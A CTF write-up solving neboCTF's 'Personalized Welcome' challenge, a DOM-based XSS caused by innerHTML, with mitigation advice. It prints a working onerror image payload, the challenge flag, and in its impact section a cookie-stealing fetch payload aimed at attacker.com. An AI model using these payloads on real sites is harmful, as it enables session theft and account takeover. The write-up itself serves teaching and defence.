# neboCTF — Web Exploitation Write-Up: DOM-Based XSS

## Challenge Details

*   **Challenge Name:** Personalized Welcome
*   **Category:** Web Exploitation
*   **Difficulty:** Medium
*   **Author:** TitoDevsec (T1t0D3v$3c)

## 1. Introduction

This write-up details the exploitation of a DOM-Based Cross-Site Scripting (XSS) vulnerability identified in the "Personalized Welcome" challenge from neboCTF. The challenge involved a web application designed to display a customized greeting based on a URL parameter. A critical hint provided was that "The server doesn’t read or echo it," strongly suggesting a client-side vulnerability. This scenario is a classic indicator of DOM-Based XSS, where user-supplied data is processed by client-side scripts without proper sanitization, leading to the dynamic injection of malicious content into the Document Object Model (DOM).

## 2. Initial Reconnaissance and Hypothesis Formulation

Upon accessing the application, it was observed that appending a `name` parameter to the URL (e.g., `?name=Tito`) dynamically updated the welcome message on the homepage. Crucially, inspection of the HTTP response using a proxy tool like Burp Suite confirmed that the supplied `name` parameter was not reflected in the server's response. This observation reinforced the hypothesis that the application's client-side JavaScript was responsible for parsing the URL parameter and injecting its value directly into the DOM.

This behavior immediately raised concerns regarding the method of DOM manipulation. If the client-side script utilized `innerHTML` to insert the user-controlled input, it would be susceptible to HTML injection, thereby enabling the execution of arbitrary JavaScript. Conversely, if `textContent` were used, the input would be rendered as plain text, mitigating the XSS risk.

### Key Observations:

*   **Client-Side Processing:** The `name` parameter was processed exclusively by the browser, with no server-side reflection.
*   **Dynamic DOM Update:** JavaScript dynamically updated the welcome message based on the URL parameter.
*   **Hidden Token:** A hidden `div` element containing a token (`data-value="c_RlJq7mb5dnfWrVI4ChqiUaq9F20U9LhtZNVNsDWfM"`) was present in the HTML response, indicating potential sensitive data within the DOM.

## 3. Exploitation: Identifying and Triggering DOM-Based XSS

The primary objective was to confirm the DOM-Based XSS vulnerability and achieve arbitrary JavaScript execution. Initial attempts involved injecting a standard `<script>alert(1)</script>` payload via the `name` parameter:

`?name=<script>alert(1)</script>`

This payload did not execute. Common reasons for such a failure include client-side filtering of `<script>` tags or browser-level security mechanisms that prevent the execution of dynamically inserted script elements. To circumvent these restrictions, an alternative approach focusing on HTML elements with event handlers was adopted.

### Successful Payload:

`?name=<img src=x onerror=alert(1)>`

This payload successfully triggered an `alert(1)` pop-up. The mechanism behind its success is as follows:

1.  The `<img>` tag attempts to load an image from `src=x`, which is an invalid or non-existent source.
2.  The browser fails to load the image, consequently triggering the `onerror` event handler.
3.  The `alert(1)` JavaScript function, embedded within the `onerror` attribute, is then executed.

Upon successful execution of the `alert(1)` payload, the challenge revealed the flag: `FLAG{dom_krr_challenge}`.

### Underlying Mechanism:

The success of the `onerror` payload strongly suggests that the vulnerable client-side JavaScript code was similar to the following:

```javascript
const params = new URLSearchParams(window.location.search);
const name = params.get("name");
document.getElementById("welcome").innerHTML = name;
```

The use of `innerHTML` is the critical flaw. When `innerHTML` is used with unsanitized user input, the browser parses the input as HTML, converting any embedded tags into actual DOM elements. This allows event handlers, such as `onerror`, to be registered and subsequently executed. Had `textContent` been used instead, the input would have been treated as plain text, preventing any HTML or script execution.

## 4. Vulnerability Classification

This vulnerability is classified as **DOM-Based Cross-Site Scripting (XSS)**. It is distinct from Reflected XSS and Stored XSS because:

*   **No Server-Side Interaction:** The malicious input is never sent to the server, nor is it stored on the server. The attack occurs entirely within the client's browser.
*   **Client-Side Source:** The vulnerability originates from the client-side script's unsafe handling of user-controlled data, which directly manipulates the DOM.

## 5. Real-World Impact

In a production environment, a successful DOM-Based XSS attack could lead to severe consequences, including:

*   **Session Hijacking:** Stealing user session cookies, allowing an attacker to impersonate the victim.
*   **CSRF Token Exfiltration:** Obtaining Cross-Site Request Forgery (CSRF) tokens, enabling attackers to perform unauthorized actions on behalf of the user.
*   **Sensitive Data Disclosure:** Reading and exfiltrating hidden DOM elements or other sensitive client-side data.
*   **Defacement and Redirection:** Modifying the appearance of the webpage or redirecting users to malicious sites.
*   **Phishing Attacks:** Presenting fake login forms or other deceptive content to trick users into revealing credentials.
*   **Account Takeover:** In conjunction with other vulnerabilities or social engineering, leading to full account compromise.

An example of a real-world attack payload for cookie exfiltration would be:

` <img src=x onerror="fetch(\'https://attacker.com/?cookie=\'+document.cookie)">`

This payload would silently send the victim's session cookies to an attacker-controlled server.

## 6. Mitigation Strategies

To prevent DOM-Based XSS vulnerabilities, developers should adhere to the following secure coding practices:

*   **Prefer `textContent` over `innerHTML`:** Always use `textContent` or `innerText` when inserting user-controlled data into HTML elements, as these properties treat the input as plain text, preventing HTML parsing.
*   **Input Sanitization:** Implement robust client-side and server-side input sanitization using trusted libraries (e.g., DOMPurify for client-side sanitization) to remove or neutralize potentially malicious characters and scripts.
*   **Content Security Policy (CSP):** Deploy a strict Content Security Policy to restrict the sources from which scripts, styles, and other resources can be loaded. This can significantly reduce the impact of XSS attacks by preventing the execution of unauthorized scripts.
*   **Contextual Output Encoding:** Ensure that all user-supplied data is properly encoded based on the context in which it is rendered (e.g., HTML entity encoding for HTML contexts, JavaScript encoding for JavaScript contexts).

### Secure Implementation Example:

```javascript
document.getElementById("welcome").textContent = name;
```

## 7. Conclusion

This challenge effectively demonstrated the critical importance of secure client-side development practices, particularly concerning the handling of user-controlled input. The DOM-Based XSS vulnerability, stemming from the unsafe use of `innerHTML`, highlights how seemingly minor JavaScript implementation details can lead to significant security risks. Understanding the distinction between various XSS types and employing appropriate mitigation techniques are fundamental skills for any cybersecurity professional. This exercise reinforced the principle that client-side vulnerabilities can be as impactful as server-side flaws and require equally rigorous attention during development and security assessments.

## References

[1] OWASP Foundation. (n.d.). *DOM-based XSS*. Retrieved from [https://owasp.org/www-community/attacks/DOM_Based_XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
[2] PortSwigger. (n.d.). *DOM XSS*. Retrieved from [https://portswigger.net/web-security/cross-site-scripting/dom-based](https://portswigger.net/web-security/cross-site-scripting/dom-based)
